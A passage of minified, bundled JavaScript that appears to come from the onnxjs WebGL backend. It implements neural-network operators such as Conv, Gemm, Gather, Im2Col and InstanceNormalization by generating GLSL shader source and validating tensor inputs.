adjustedAttributes=getAdjustedConvAttributes(attributes,inputs),packMode=inferenceHandler.session.pack,isPointwise=1===adjustedAttributes.kernelShape[0]&&1===adjustedAttributes.kernelShape[1];if(adjustedAttributes.group>1){return[inferenceHandler.run((0,conv_grouped_1.createUnpackedGroupedConvProgramInfoLoader)(inferenceHandler,inputs,adjustedAttributes),inputs)]}return isPointwise&&packMode?[conv2DUnpackedPointwise(inferenceHandler,inputs,adjustedAttributes)]:packMode&&4===inputs[0].dims.length&&1===inputs[0].dims[0]&&!isPointwise?[(0,conv_pack_1.conv2DPacked)(inferenceHandler,inputs,adjustedAttributes)]:[conv2DUnpacked(inferenceHandler,inputs,adjustedAttributes)]},conv2DUnpackedPointwise=(inferenceHandler,inputs,attributes)=>{const xshape=inputs[0].dims,kshape=inputs[1].dims,outputShape=(0,exports.calculateOutputShape)(xshape,kshape,attributes.dilations,attributes.pads,attributes.strides),reshapedX=inferenceHandler.reshapeUnpacked(inputs[0],[xshape[1],xshape[2]*xshape[3]]),reshapedK=inferenceHandler.reshapeUnpacked(inputs[1],[kshape[0],kshape[1]]),matmulInputs=inputs.length>2?[reshapedK,reshapedX,inputs[2]]:[reshapedK,reshapedX],matmulOutput=inferenceHandler.run((0,matmul_1.createMatmulProgramInfoLoader)(matmulInputs,attributes),matmulInputs);return inferenceHandler.reshapeUnpacked(matmulOutput,outputShape)},conv2DUnpacked=(inferenceHandler,inputs,attributes)=>{const xshape=inputs[0].dims,kshape=inputs[1].dims,outputShape=(0,exports.calculateOutputShape)(xshape,kshape,attributes.dilations,attributes.pads,attributes.strides),xIm2Col=inferenceHandler.run((0,im2col_1.createIm2ColProgramInfoLoader)(inferenceHandler,inputs[0],inputs[1],outputShape,attributes),[inputs[0]]),dotProductInputs=3===inputs.length?[xIm2Col,inputs[1],inputs[2]]:[xIm2Col,inputs[1]];return inferenceHandler.run((0,dot_product_1.createDotProductProgramInfoLoader)(inferenceHandler,inputs,outputShape,attributes),dotProductInputs)},getAdjustedConvAttributes=(attributes,inputs)=>{const kernelShape=attributes.kernelShape.slice();if(0===attributes.kernelShape.length)for(let i=2;i<inputs[1].dims.length;++i)kernelShape.push(inputs[1].dims[i]);const pads=attributes.pads.slice();util_1.PoolConvUtil.adjustPadsBasedOnAutoPad(inputs[0].dims,attributes.strides,attributes.dilations,kernelShape,pads,attributes.autoPad);const newAttributes=Object.assign({},attributes);return Object.assign(newAttributes,{kernelShape:kernelShape,pads:pads,cacheKey:attributes.cacheKey}),newAttributes};exports.parseConvAttributes=node=>{const attributes=node.attributes,activationAttributes=(0,fuse_utils_1.parseInternalActivationAttributes)(attributes),autoPad=attributes.getString("auto_pad","NOTSET"),dilations=attributes.getInts("dilations",[1,1]),group=attributes.getInt("group",1),kernelShape=attributes.getInts("kernel_shape",[]),pads=attributes.getInts("pads",[0,0,0,0]),strides=attributes.getInts("strides",[1,1]);return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)(Object.assign({autoPad:autoPad,dilations:dilations,group:group,kernelShape:kernelShape,pads:pads,strides:strides},activationAttributes))};const validateInputs=(inputs,attributes)=>{if(!inputs||2!==inputs.length&&3!==inputs.length)throw new Error("Conv requires 2 or 3 inputs");if(4!==inputs[0].dims.length||4!==inputs[1].dims.length)throw new Error("currently only support 2-dimensional conv");if(inputs[0].dims[1]!==inputs[1].dims[1]*attributes.group)throw new Error("FILTER_IN_CHANNEL should be equal to DATA_CHANNEL");if(3===inputs.length&&(1!==inputs[2].dims.length||inputs[1].dims[0]!==inputs[2].dims[0]))throw new Error("invalid bias");const spatialRank=inputs[0].dims.length-2;if(attributes.dilations.length!==spatialRank)throw new Error(`dilations should be ${spatialRank}D`);if(attributes.strides.length!==spatialRank)throw new Error(`strides should be ${spatialRank}D`);if(attributes.pads.length!==2*spatialRank)throw new Error(`pads should be ${2*spatialRank}D`);if(0!==attributes.kernelShape.length&&attributes.kernelShape.length!==inputs[1].dims.length-2)throw new Error("invalid kernel shape");if("float32"!==inputs[0].type||"float32"!==inputs[1].type)throw new Error("Conv input(X,W) should be float tensor");if(3===inputs.length&&"float32"!==inputs[2].type)throw new Error("Conv input(bias) should be float tensor")}},"./lib/onnxjs/backends/webgl/ops/depth-to-space.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseDepthToSpaceAttributes=exports.depthToSpace=void 0;const transpose_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/transpose.ts");exports.depthToSpace=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);const blocksize=attributes.blocksize,blocksizeSqr=blocksize*blocksize,transposePerm="DCR"===attributes.mode?[0,3,4,1,5,2]:[0,1,4,2,5,3],firstReshapeShape="DCR"===attributes.mode?[inputs[0].dims[0],blocksize,blocksize,inputs[0].dims[1]/blocksizeSqr,inputs[0].dims[2],inputs[0].dims[3]]:[inputs[0].dims[0],inputs[0].dims[1]/blocksizeSqr,blocksize,blocksize,inputs[0].dims[2],inputs[0].dims[3]],firstReshapedTensor=inferenceHandler.reshapeUnpacked(inputs[0],firstReshapeShape),transposeAttributes={perm:transposePerm,cacheKey:`${transposePerm}`},[transposeOutput]=(0,transpose_1.transpose)(inferenceHandler,[firstReshapedTensor],transposeAttributes),secondReshapeShape=[inputs[0].dims[0],inputs[0].dims[1]/blocksizeSqr,inputs[0].dims[2]*blocksize,inputs[0].dims[3]*blocksize];return[inferenceHandler.reshapeUnpacked(transposeOutput,secondReshapeShape)]};exports.parseDepthToSpaceAttributes=node=>{const blocksize=node.attributes.getInt("blocksize");if(blocksize<1)throw new Error(`blocksize must be >= 1, but got : ${blocksize} for DepthToSpace`);const mode=node.attributes.getString("mode","DCR");if("DCR"!==mode&&"CRD"!==mode)throw new Error(`unrecognized mode: ${mode} for DepthToSpace`);return{mode:mode,blocksize:blocksize}};const validateInputs=inputs=>{if(1!==inputs.length)throw new Error(`DepthToSpace expect 1 inputs, but got ${inputs.length}`);if("string"===inputs[0].type||4!==inputs[0].dims.length)throw new TypeError("DepthToSpace input should be a 4-D numeric tensor")}},"./lib/onnxjs/backends/webgl/ops/dot-product.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createDotProductProgramInfoLoader=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),fuse_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/fuse-utils.ts"),im2col_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/im2col.ts");exports.createDotProductProgramInfoLoader=(inferenceHandler,inputs,outputShape,attributes)=>{const metadata=((hasBias,attributes)=>({name:"ConvDotProduct",inputNames:hasBias?["Im2Col","K","B"]:["Im2Col","K"],inputTypes:hasBias?[types_1.TextureType.unpacked,types_1.TextureType.packedLastDimension,types_1.TextureType.unpacked]:[types_1.TextureType.unpacked,types_1.TextureType.packedLastDimension],cacheKey:attributes.activationCacheKey}))(inputs.length>2,attributes);return Object.assign(Object.assign({},metadata),{get:()=>((inferenceHandler,metadata,inputs,outputShape,attributes)=>{const xshape=inputs[0].dims,kshape=inputs[1].dims,adjustedKernelShape=[kshape[0],Math.ceil(xshape[1]*kshape[2]*kshape[3]/4)],im2colShape=(0,im2col_1.calculateIm2ColDims)(xshape,kshape,outputShape),[kWidth,kHeight]=inferenceHandler.calculateTextureWidthAndHeight(adjustedKernelShape,types_1.TextureType.packedLastDimension),im2colStrides=util_1.ShapeUtil.computeStrides(im2colShape),[im2colWidth,im2colHeight]=inferenceHandler.calculateTextureWidthAndHeight(im2colShape,types_1.TextureType.packedLastDimension),rank=outputShape.length,initValue=inputs.length<3?"0.0":"_B(b)",sharedDim=Math.ceil(xshape[1]*kshape[2]*kshape[3]/4),{activationFunction:activationFunction,applyActivation:applyActivation}=(0,fuse_utils_1.getActivationSnippet)(attributes),glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),shaderSource=`\n${activationFunction}\nfloat process(int indices[${rank}]) {\n  int b[1];\n  b[0] = indices[1];\n  int im2col[4];\n  im2col[0] = indices[0];\n  im2col[1] = indices[2];\n  im2col[2] = indices[3];\n  int im2colOffset = im2col[0] * ${im2colStrides[0]} + im2col[1] * ${im2colStrides[1]} + im2col[2] * ${im2colStrides[2]};\n  int kernelOffset = indices[1] * ${adjustedKernelShape[1]};\n  float value = ${initValue};\n  for (int i = 0; i < ${sharedDim}; ++i) {\n    vec2 im2colCoords = offsetToCoords(im2colOffset, ${im2colWidth}, ${im2colHeight});\n    vec2 kernelCoords = offsetToCoords(kernelOffset, ${kWidth}, ${kHeight});\n    value += dot(${glsl.texture2D}(Im2Col, im2colCoords), ${glsl.texture2D}(K, kernelCoords));\n    ++im2colOffset;\n    ++kernelOffset;\n  }\n  ${applyActivation}\n  return value;\n}`;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})})(inferenceHandler,metadata,inputs,outputShape,attributes)})}},"./lib/onnxjs/backends/webgl/ops/flatten.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseFlattenAttributes=exports.flatten=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts");exports.flatten=(inferenceHandler,inputs,axis)=>{validateInputs(inputs,axis);const outputDims=util_1.ShapeUtil.flattenShape(inputs[0].dims,axis);return[inferenceHandler.reshapeUnpacked(inputs[0],outputDims)]};exports.parseFlattenAttributes=node=>node.attributes.getInt("axis",1);const validateInputs=(inputs,axis)=>{if(!inputs||1!==inputs.length)throw new Error("Flatten requires 1 input.");const r=inputs[0].dims.length;if(0===r)throw new Error("scalar tensor is not supported.");if(axis<-r||axis>r)throw new Error("Invalid axis");if("string"===inputs[0].type)throw new Error("string tensor is not supported.")}},"./lib/onnxjs/backends/webgl/ops/fuse-utils.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseInternalActivationAttributes=exports.getActivationSnippet=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts"),unary_op_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/unary-op.ts");exports.getActivationSnippet=function getActivationSnippet(attributes){let func;switch(attributes.activation){case"Relu":func=(0,unary_op_1.glslRelu)();break;case"Sigmoid":func=(0,unary_op_1.glslSigmoid)();break;case"Clip":func=(0,unary_op_1.glslClip)(attributes.clipMin,attributes.clipMax);break;default:return{activationFunction:"",applyActivation:""}}const activationName=func.name;return{activationFunction:func.body,applyActivation:`value = ${activationName}_(value);`}};exports.parseInternalActivationAttributes=attributes=>{const activation=attributes.getString("activation","");if("Clip"===activation){const[clipMin,clipMax]=attributes.getFloats("activation_params",[util_1.MIN_CLIP,util_1.MAX_CLIP]);return{activation:activation,clipMax:clipMax,clipMin:clipMin,activationCacheKey:`${activation}:${clipMin},${clipMax}`}}return{activation:activation,activationCacheKey:activation}}},"./lib/onnxjs/backends/webgl/ops/gather.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseGatherAttributes=exports.gather=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),operators_1=__webpack_require__("./lib/onnxjs/operators.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.gather=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs,attributes.axis);return[inferenceHandler.run(createGatherProgramInfoLoader(inferenceHandler,inputs,attributes),inputs)]};exports.parseGatherAttributes=node=>(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({axis:node.attributes.getInt("axis",0)});const gatherProgramMetadata={name:"Gather",inputNames:["A","B"],inputTypes:[types_1.TextureType.unpacked,types_1.TextureType.unpacked]},createGatherProgramInfoLoader=(handler,inputs,attributes)=>{const metadata=Object.assign(Object.assign({},gatherProgramMetadata),{cacheHint:attributes.cacheKey});return Object.assign(Object.assign({},metadata),{get:()=>((handler,metadata,inputs,axis)=>{const inputShape=inputs[0].dims.slice(),indexDataShape=inputs[1].dims.slice(),outputShape=new Array(inputShape.length+indexDataShape.length-1);axis=util_1.ShapeUtil.normalizeAxis(axis,inputShape.length);const indexCopyOps=[];for(let i=0;i<outputShape.length;i++)i<axis?(outputShape[i]=inputShape[i],indexCopyOps.push(`inputIdx[${i}] = outputIdx[${i}];`)):i<axis+indexDataShape.length?(outputShape[i]=indexDataShape[i-axis],indexCopyOps.push(`indexDataIdx[${i-axis}] = outputIdx[${i}];`)):(outputShape[i]=inputShape[i-indexDataShape.length+1],indexCopyOps.push(`inputIdx[${i-indexDataShape.length+1}] = outputIdx[${i}];`));const shaderSource=`\n      float process(int outputIdx[${outputShape.length||1}]) {\n        int inputIdx[${inputShape.length}];\n        int indexDataIdx[${indexDataShape.length||1}];\n        indexDataIdx[0] = 0;\n        ${indexCopyOps.join("\n        ")}\n        int idx = int(_B(indexDataIdx));\n        inputIdx[${axis}] = idx < 0 ? idx + ${inputShape[axis]} : idx;\n        return _A(inputIdx);\n      }`;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})})(0,metadata,inputs,attributes.axis)})},validateInputs=(inputs,axis)=>{if(!inputs||2!==inputs.length)throw new Error("Gather requires 2 inputs.");const tensorRank=inputs[0].dims.length;if(tensorRank<1)throw new Error("Invalid input shape.");if(axis<-tensorRank||axis>tensorRank-1)throw new Error("Invalid axis.");if(-1===operators_1.NUMBER_TYPES.indexOf(inputs[0].type))throw new Error("Invaid input type.");if("int32"!==inputs[1].type&&"int16"!==inputs[1].type)throw new Error("Invaid input type.")}},"./lib/onnxjs/backends/webgl/ops/gemm.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseGemmAttributesV11=exports.parseGemmAttributesV7=exports.gemm=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.gemm=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs,attributes);return[inferenceHandler.run(createGemmProgramInfoLoader(inputs,attributes),inputs)]};const parseGemmAttributes=(node,isOptionalC)=>{const transA=0!==node.attributes.getInt("transA",0),transB=0!==node.attributes.getInt("transB",0),alpha=node.attributes.getFloat("alpha",1),beta=node.attributes.getFloat("beta",1);return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({transA:transA,transB:transB,alpha:alpha,beta:beta,isOptionalC:isOptionalC})};exports.parseGemmAttributesV7=node=>parseGemmAttributes(node,!1);exports.parseGemmAttributesV11=node=>parseGemmAttributes(node,!0);const createGemmProgramInfoLoader=(inputs,attributes)=>{const metadata={name:"Gemm",inputNames:3===inputs.length?["A","B","C"]:["A","B"],inputTypes:3===inputs.length?[types_1.TextureType.unpacked,types_1.TextureType.unpacked,types_1.TextureType.unpacked]:[types_1.TextureType.unpacked,types_1.TextureType.unpacked],key:attributes.cacheKey};return Object.assign(Object.assign({},metadata),{get:()=>createGemmProgramInfo(metadata,inputs,attributes)})},createGemmProgramInfo=(metadata,inputs,attributes)=>{const aShape=inputs[0].dims.slice(),bShape=inputs[1].dims.slice(),[M,N]=util_1.GemmUtil.getShapeOfGemmResult(aShape,attributes.transA,bShape,attributes.transB,3===inputs.length?inputs[2].dims:void 0),outputShape=[M,N];if(!outputShape)throw new Error("Can't use gemm on the given tensors");let sharedDim=aShape[aShape.length-1],line="";attributes.transA&&(sharedDim=aShape[0]),attributes.transA&&attributes.transB?line="value += _A_T(a) * _B_T(b);":attributes.transA&&!attributes.transB?line="value += _A_T(a) * _B(b);":!attributes.transA&&attributes.transB?line="value += _A(a) * _B_T(b);":attributes.transA||attributes.transB||(line="value += _A(a) * _B(b);");const rank=outputShape.length,shaderSource=`\n      float process(int indices[${rank}]) {\n          int a[${rank}];\n          int b[${rank}];\n          ${3===inputs.length?`int c[${inputs[2].dims.length}];`:""}\n\n          copyVec(indices, a);\n          copyVec(indices, b);\n          ${3===inputs.length?"bcastIndices_C(indices, c);":""}\n\n          float value = 0.0;\n          for (int k=0; k<${sharedDim}; ++k) {\n              a[${rank-1}] = k;\n              b[${rank-2}] = k;\n              ${line}\n          }\n\n          value = value * alpha;\n          ${3===inputs.length?"value += beta * _C(c);":""}\n          return value;\n      }`;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},variables:[{name:"alpha",type:"float",data:attributes.alpha},{name:"beta",type:"float",data:attributes.beta}],shaderSource:shaderSource})},validateInputs=(inputs,attributes)=>{if(!inputs)throw new Error("Input is missing");if(attributes.isOptionalC&&(inputs.length<2||inputs.length>3))throw new Error("Invaid input shape.");if(!attributes.isOptionalC&&3!==inputs.length)throw new Error("Gemm requires 3 inputs");if(3===inputs.length&&1!==inputs[2].dims.length&&2!==inputs[2].dims.length)throw new Error("Invalid input shape of C");if("float32"!==inputs[0].type&&"float64"!==inputs[0].type||"float32"!==inputs[1].type&&"float64"!==inputs[1].type||3===inputs.length&&"float32"!==inputs[2].type&&"float64"!==inputs[2].type)throw new Error("Invalid input type.");if(inputs[0].type!==inputs[1].type||3===inputs.length&&inputs[0].type!==inputs[2].type)throw new Error("Input types are mismatched")}},"./lib/onnxjs/backends/webgl/ops/im2col-pack.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createPackedIm2ColProgramInfoLoader=void 0;const glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),packing_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/packing-utils.ts");exports.createPackedIm2ColProgramInfoLoader=(inferenceHandler,x,w,outputShape,attributes)=>{const metadata=(cacheHint=attributes.cacheKey,{name:"Im2Col (packed)",inputNames:["A"],inputTypes:[types_1.TextureType.packed],cacheHint:cacheHint});var cacheHint;return Object.assign(Object.assign({},metadata),{get:()=>((inferenceHandler,metadata,x,w,outputShape,attributes)=>{const xshape=x.dims,wshape=w.dims,rank=outputShape.length,im2colShape=[wshape[1]*wshape[2]*wshape[3],outputShape[2]*outputShape[3]],kernelSize=wshape[2]*wshape[3],unpackChannel=(0,packing_utils_1.unpackFromChannel)(),glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version);let unrolled="";for(let row=0;row<=1;row++)for(let col=0;col<=1;col++)unrolled+=`\n            blockIndex = rc.x + ${col};\n            pos = rc.y + ${row};\n\n            if(blockIndex < ${im2colShape[1]} && pos < ${im2colShape[0]}) {\n              offsetY = int(blockIndex / (${outputShape[rank-1]})) * ${attributes.strides[0]} -\n                ${attributes.pads[0]};\n              d0 = offsetY + ${attributes.dilations[0]} * (imod(pos, ${kernelSize}) / ${wshape[2]});\n\n              if(d0 < ${xshape[2]} && d0 >= 0) {\n                offsetX = imod(blockIndex, ${outputShape[rank-1]}) * ${attributes.strides[1]} -\n                  ${attributes.pads[1]};\n                d1 = offsetX + ${attributes.dilations[1]} * imod(imod(pos, ${kernelSize}), ${wshape[2]});\n\n                if(d1 < ${xshape[3]} && d1 >= 0) {\n\n                  ch = int(float(pos)/ ${kernelSize}.);\n                    innerDims = vec2(d0, d1);\n                    result[${2*row+col}] = getChannel(\n                      getA(0, ch, int(innerDims.x),\n                      int(innerDims.y)), innerDims);\n                }\n              }\n            }\n\n          `;const shaderSource=`\n      ${unpackChannel}\n\n      void main() {\n        ivec2 rc = getOutputCoords();\n          vec4 result = vec4(0.0);\n          int blockIndex, pos, offsetY, d0, offsetX, d1, ch;\n          vec2 innerDims;\n          ${unrolled}\n          ${glsl.output} = result;\n      }\n            `;return Object.assign(Object.assign({},metadata),{output:{dims:im2colShape,type:x.type,textureType:types_1.TextureType.packed},shaderSource:shaderSource,hasMain:!0})})(inferenceHandler,metadata,x,w,outputShape,attributes)})}},"./lib/onnxjs/backends/webgl/ops/im2col.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.calculateIm2ColDims=exports.createIm2ColProgramInfoLoader=void 0;const types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.createIm2ColProgramInfoLoader=(inferenceHandler,x,w,outputShape,attributes)=>{const metadata=(cacheHint=attributes.cacheKey,{name:"Im2Col",inputNames:["X"],inputTypes:[types_1.TextureType.unpacked],cacheHint:cacheHint});var cacheHint;return Object.assign(Object.assign({},metadata),{get:()=>((inferenceHandler,metadata,x,w,outputShape,attributes)=>{const xshape=x.dims,wshape=w.dims,rank=outputShape.length,im2colDims=(0,exports.calculateIm2ColDims)(xshape,wshape,outputShape,4),shaderSource=`\n        const int XC = ${xshape[1]};\n        const int XH = ${xshape[2]};\n        const int XW = ${xshape[3]};\n        const int KH = ${attributes.kernelShape[0]};\n        const int KW = ${attributes.kernelShape[1]};\n        const int dilationH = ${attributes.dilations[0]};\n        const int dilationW = ${attributes.dilations[1]};\n        const int strideH = ${attributes.strides[0]};\n        const int strideW = ${attributes.strides[1]};\n        const int padH = ${attributes.pads[0]};\n        const int padW = ${attributes.pads[1]};\n        const int KHKW = KH*KW;\n        const int XCKHKW = XC * KHKW;\n        const int outputChannels = 4;\n        vec4 process(int indices[${rank}]) {\n          int b  = indices[0]; // batch size\n          int oh = indices[1] * strideH - padH; //output height\n          int ow = indices[2] * strideW - padW; //output width\n          int p = indices[3] * outputChannels; //patch\n          vec4 value = vec4(0.0);\n          for(int i=0; i < outputChannels; ++i) {\n            if(p < XCKHKW) {\n              int patchC = p / KHKW;\n              int patchH = (p - patchC*KHKW) / KW;\n              int patchW = (p - patchC*KHKW) - patchH * KW;\n              int xh2 = oh + patchH * dilationH;\n              int xw2 = ow + patchW * dilationW;\n              int x[${xshape.length}];\n              x[0] = b;\n              x[1] = patchC;\n              x[2] = xh2;\n              x[3] = xw2;\n              if(xh2 >= 0 &&\n                  xh2 < XH &&\n                  xw2 >= 0 &&\n                  xw2 < XW) {\n                value[i] = _X(x);\n              }\n            }\n            ++p;\n          }\n          return value;\n        }\n        `;return Object.assign(Object.assign({},metadata),{output:{dims:im2colDims,type:x.type,textureType:types_1.TextureType.packedLastDimension},shaderSource:shaderSource})})(0,metadata,x,w,outputShape,attributes)})};exports.calculateIm2ColDims=(inputShape,kernelShape,outputShape,channels=4)=>[outputShape[0],outputShape[2],outputShape[3],Math.ceil(inputShape[1]*kernelShape[2]*kernelShape[3]/channels)]},"./lib/onnxjs/backends/webgl/ops/image-scaler.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseImageScalerAttributes=exports.imageScaler=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.imageScaler=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);return[inferenceHandler.run(createImageScalerProgramInfoLoader(inferenceHandler,inputs,attributes),inputs)]};exports.parseImageScalerAttributes=node=>{const scale=node.attributes.getFloat("scale"),bias=node.attributes.getFloats("bias");return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({scale:scale,bias:bias})};const imageScalerProgramMetadata={name:"ImageScaler",inputNames:["X"],inputTypes:[types_1.TextureType.unpacked]},createImageScalerProgramInfoLoader=(handler,inputs,attributes)=>{const metadata=Object.assign(Object.assign({},imageScalerProgramMetadata),{cacheHint:attributes.cacheKey});return Object.assign(Object.assign({},metadata),{get:()=>((handler,metadata,inputs,attributes)=>{const outputShape=inputs[0].dims.slice(),rank=outputShape.length,shaderSource=`\n      ${createGetBiasMethod(attributes.bias.length)}\n      float process(int indices[${rank}]) {\n        return _X(indices) * scale + getBias(bias, indices[1]);\n      }`;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},variables:[{name:"bias",type:"float",arrayLength:attributes.bias.length,data:attributes.bias},{name:"scale",type:"float",data:attributes.scale}],shaderSource:shaderSource})})(0,metadata,inputs,attributes)})},createGetBiasMethod=numChannels=>{const codeLines=[`float getBias(float bias[${numChannels}], int channel) {`];for(let i=0;i<numChannels;++i)0===i?codeLines.push(`\tif (channel == ${i}) { return bias[${i}]; }`):i===numChannels-1?codeLines.push(`\telse { return bias[${i}]; }`):codeLines.push(`\telse if (channel == ${i}) { return bias[${i}]; }`);return codeLines.push("\t}"),codeLines.join("\n")},validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("ImageScaler requires 1 input.");if(4!==inputs[0].dims.length)throw new Error("Invalid input shape.");if("float32"!==inputs[0].type&&"float64"!==inputs[0].type)throw new Error("Invalid input type.")}},"./lib/onnxjs/backends/webgl/ops/instance-normalization.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseInstanceNormalizationAttributes=exports.instanceNormalization=void 0;const glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.instanceNormalization=(inferenceHandler,inputs,epsilon)=>{validateInputs(inputs);const meanAndVariance=inferenceHandler.run(createMeanAndVarianceProgramInfoLoader(inputs[0]),inputs);return[inferenceHandler.run(createComputeOutputProgramInfoLoader(inferenceHandler,inputs[0],epsilon,meanAndVariance.dims),[inputs[0],meanAndVariance,inputs[1],inputs[2]])]};exports.parseInstanceNormalizationAttributes=node=>node.attributes.getFloat("epsilon",1e-5);const meanAndVarianceProgramMetadata={name:"InstanceNormalization_MeanAndVariance",inputNames:["X"],inputTypes:[types_1.TextureType.unpacked]},createMeanAndVarianceProgramInfoLoader=input=>Object.assign(Object.assign({},meanAndVarianceProgramMetadata),{get:()=>((metadata,input)=>{const xDims=input.dims.slice(),channel=xDims[1],channelSize=xDims[2]*xDims[3],outputShape=[xDims[0],channel],shaderSource=`\n      vec4 process(int[2] indices) {\n        vec4 v = vec4(0.0);\n        int a[4];\n        a[0] = indices[0];\n        a[1] = indices[1];\n        float temp = 0.0;\n        for(int a2=0; a2<${xDims[2]}; a2++) {\n          a[2] = a2;\n          for(int a3=0; a3<${xDims[3]}; a3++) {\n            a[3] = a3;\n            float x = _X(a);\n            temp += x;\n          }\n        }\n        float mean = temp / float(${channelSize});\n        temp = 0.0;\n        for(int a2=0; a2<${xDims[2]}; a2++) {\n          a[2] = a2;\n          for(int a3=0; a3<${xDims[3]}; a3++) {\n            a[3] = a3;\n            float x = _X(a);\n            temp += (x - mean) * (x - mean);\n          }\n        }\n        v.r = mean;\n        v.g = temp / float(${channelSize});\n\n        return v;\n      }`;return Object.assign(Object.assign({},metadata),{output:{dims:outputShape,type:input.type,textureType:types_1.TextureType.packedLastDimension},shaderSource:shaderSource})})(meanAndVarianceProgramMetadata,input)}),computeOutputProgramMetadata={name:"InstanceNormalization_ComputeOutput",inputNames:["X","MeanAndVariance","Scale","B"],inputTypes:[types_1.TextureType.unpacked,types_1.TextureType.packedLastDimension,types_1.TextureType.unpacked,types_1.TextureType.unpacked]},createComputeOutputProgramInfoLoader=(inferenceHandler,input,epsilon,meanAndVarianceShape)=>{const metadata=Object.assign(Object.assign({},computeOutputProgramMetadata),{cacheHint:`${epsilon}`});return Object.assign(Object.assign({},metadata),{get:()=>((inferenceHandler,metadata,input,epsilon,meanAndVarianceShape)=>{const glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),[textureWidth,textureHeight]=inferenceHandler.calculateTextureWidthAndHeight(meanAndVarianceShape,types_1.TextureType.packedLastDimension),[meanAndVarianceWidth,meanAndVarianceHeight]=[textureWidth/4,textureHeight],shaderSource=`\n      vec4 get_MeanAndVariance(int[2] mv) {\n        int offset = indicesToOffset_MeanAndVariance(mv);\n        vec2 coords = offsetToCoords(offset, ${meanAndVarianceWidth}, ${meanAndVarianceHeight});\n        return ${glsl.texture2D}(MeanAndVariance, coords);\n      }\n\n      float process(int[4] indices) {\n        int mv[2];\n        mv[0] = indices[0];\n        mv[1] = indices[1];\n        vec4 mean_and_variance = get_MeanAndVariance(mv);\n        float mean = mean_and_variance.r;\n        float variance = mean_and_variance.g;\n\n        int sb[1];\n        sb[0] = indices[1];\n        float scale = _Scale(sb);\n        float b = _B(sb);\n\n        return scale * (_X(indices) - mean) / sqrt(variance + epsilon) + b;\n      }`;return Object.assign(Object.assign({},metadata),{output:{dims:input.dims,type:input.type,textureType:types_1.TextureType.unpacked},variables:[{name:"epsilon",type:"float",data:epsilon}],shaderSource:shaderSource})})(inferenceHandler,metadata,input,epsilon,meanAndVarianceShape)})},validateInputs=inputs=>{if(!inputs||3!==inputs.length)throw new Error("InstanceNormalization requires 3 inputs.");const X=inputs[0],scale=inputs[1],B=inputs[2];if(X.dims.length<3||1!==scale.dims.length||1!==B.dims.length)throw new Error("Invalid input shape.");if(scale.dims[0]!==X.dims[1]||B.dims[0]!==X.dims[1])throw new Error("Input shapes are mismatched.");if("float32"!==X.type&&"float64"!==X.type||"float32"!==scale.type&&"float64"!==scale.type||"float32"!==B.type&&"float64"!==B.type)throw new Error("Invalid input 